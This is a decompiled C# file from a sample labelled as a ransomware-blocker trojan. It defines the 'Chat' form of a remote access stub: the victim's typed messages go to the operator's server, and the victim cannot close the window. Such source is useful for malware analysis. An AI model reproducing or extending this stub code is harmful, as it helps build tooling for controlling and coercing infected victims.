// Decompiled with JetBrains decompiler
// Type: VanillaStub.Forms.Chat
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace VanillaStub.Forms
{
  public class Chat : Form
  {
    private IContainer components = (IContainer) null;
    public Panel panel1;
    public RichTextBox txtChat;
    public TextBox txtSend;
    private Button btnSend;

    public Chat() => this.InitializeComponent();

    private void OnClosing(object sender, FormClosingEventArgs e)
    {
      if (e.CloseReason != CloseReason.UserClosing)
        return;
      e.Cancel = true;
    }

    private void btnSend_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrWhiteSpace(this.txtChat.Text))
        this.txtChat.Text = "You: " + this.txtSend.Text;
      else
        this.txtChat.AppendText(Environment.NewLine + "You: " + this.txtSend.Text);
      List<byte> byteList = new List<byte>();
      byteList.Add((byte) 16);
      byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(this.txtSend.Text));
      VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      this.txtSend.Text = "";
    }

    private void KeyDown(object sender, KeyEventArgs e)
    {
      if (e.KeyCode != Keys.Return)
        return;
      if (string.IsNullOrWhiteSpace(this.txtChat.Text))
        this.txtChat.Text = "You: " + this.txtSend.Text;
      else
        this.txtChat.AppendText(Environment.NewLine + "You: " + this.txtSend.Text);
      List<byte> byteList = new List<byte>();
      byteList.Add((byte) 16);
      byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes(this.txtSend.Text));
      VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
      this.txtSend.Text = "";
    }

    private void OnVisibleChange(object sender, EventArgs e)
    {
      if (!this.Visible)
        return;
      List<byte> byteList = new List<byte>();
      byteList.Add((byte) 16);
      byteList.AddRange((IEnumerable<byte>) Encoding.ASCII.GetBytes("Connected to chat"));
      VanillaStub.Helpers.Networking.Networking.MainClient.Send(byteList.ToArray());
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.panel1 = new Panel();
      this.txtChat = new RichTextBox();
      this.txtSend = new TextBox();
      this.btnSend = new Button();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.panel1.BorderStyle = BorderStyle.FixedSingle;
      this.panel1.Controls.Add((Control) this.txtChat);
      this.panel1.Location = new Point(12, 12);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(620, 316);
      this.panel1.TabIndex = 7;
      this.txtChat.BorderStyle = BorderStyle.None;
      this.txtChat.Location = new Point(-1, -1);
      this.txtChat.Name = "txtChat";
      this.txtChat.ReadOnly = true;
      this.txtChat.Size = new Size(620, 316);
      this.txtChat.TabIndex = 1;
      this.txtChat.Text = "";
      this.txtSend.Location = new Point(12, 336);
      this.txtSend.Name = "txtSend";
      this.txtSend.Size = new Size(539, 20);
      this.txtSend.TabIndex = 8;
      this.txtSend.KeyDown += new KeyEventHandler(this.KeyDown);
      this.btnSend.Location = new Point(557, 334);
      this.btnSend.Name = "btnSend";
      this.btnSend.Size = new Size(75, 23);
      this.btnSend.TabIndex = 9;
      this.btnSend.Text = "Send";
      this.btnSend.UseVisualStyleBackColor = true;
      this.btnSend.Click += new EventHandler(this.btnSend_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(644, 368);
      this.Controls.Add((Control) this.btnSend);
      this.Controls.Add((Control) this.txtSend);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Chat);
      this.ShowIcon = false;
      this.Text = nameof (Chat);
      this.FormClosing += new FormClosingEventHandler(this.OnClosing);
      this.VisibleChanged += new EventHandler(this.OnVisibleChange);
      this.panel1.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
